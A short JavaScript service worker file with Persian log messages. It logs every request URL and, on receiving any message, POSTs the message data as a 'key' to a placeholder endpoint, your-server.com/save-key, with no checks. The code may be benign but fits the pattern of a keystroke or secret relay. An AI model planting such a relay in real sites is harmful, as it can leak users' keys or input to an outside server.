self.addEventListener("install", (event) => {
    self.skipWaiting();
});

self.addEventListener("activate", (event) => {
    console.log("Service Worker فعال شد!");
});

self.addEventListener("fetch", (event) => {
    console.log("درخواست جدید:", event.request.url);
});

self.addEventListener("message", (event) => {
    fetch("https://your-server.com/save-key", {  
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: event.data })
    });
});
